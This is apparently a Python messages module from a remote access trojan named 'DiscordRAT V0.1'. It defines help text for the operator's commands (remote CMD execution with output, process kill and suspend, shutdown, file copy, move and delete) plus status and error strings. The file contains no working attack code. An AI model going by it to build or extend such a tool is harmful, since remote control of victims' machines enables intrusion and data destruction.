COMMAND_DOES_NOT_EXISTS = 'that command does not exists "{command}"'
PROC_NOT_FOUND = 'Process not found'
SRC_NOT_EXISTS = 'Src does not exists'
DEST_NOT_EXISTS = 'Dest does not exists'
PATH_NOT_EXISTS = 'Path does not exists'
HELP = '''
DiscordRAT V0.1 by crazyproger1

Available Commands:
==General==
$help - show this message
$chmd mode - change working mode (modes: 0 - basic, 1 - filesystem)
$start app - start application (app - full path)
$shutdown [time] - shutdown (time - time before shutdown in secs)
$exit - close session

==Command Line==
$exec cmd - execute cmd command (cmd - Windows CMD command)
$execo cmd - the same as above but also return output

==Processes==
$kill [pid] / [name] - kill process (pid - process id, name - process name)
$susp [pid] / [name] - suspend process (pid - process id, name - process name)
$prlst - get list of all processes

Examples:
$help 
$exec cmd = 'start explorer'
$chmd mode = 1
'''

FILESYSTEM_HELP = '''
DiscordRAT V0.1 by crazyproger1

Available Commands:
$rmde - reset mode to 0 (basic)
$dir / $ls [path] - display list of the folder content (path - path to folder)
$cd path - change working directory (path - path to folder)
$cwd - get current working directory
$bsdir - get base working directory
$cp src dest - copy file or directory (src - source path, dest - destination path)
$mv src dest - move file or directory (src - source path, dest - destination path)
$del path - delete file or directory 

Examples:
$rmde
$dir D:/
$ls C:/
'''
KILLED = 'Process killed'
SUSPENDED = 'Process suspended'
EXECUTED = 'Command executed ({status})'
APPLICATION_STARTED = 'Application started'
MODE_CHANGED = 'Mode changed'
MODE_AUTO_CHANGE = 'Mode automatically changed to {value} ({name})'
DIR_CHANGED = 'Directory changed ({cwd})'
COPIED = 'Copied'
MOVED = 'Moved'
REMOVED = 'Removed'

ERR_COMMAND = 'COMMAND ERROR: '
ERR_ARG = 'ARGUMENT ERROR: '
ERR_UNIDENTIFIED = 'UNIDENTIFIED ERROR: '
ERR_OUTPUT = 'OUTPUT ERROR: '
ERR_COMMAND_EXECUTION = 'COMMAND EXECUTION ERROR: '
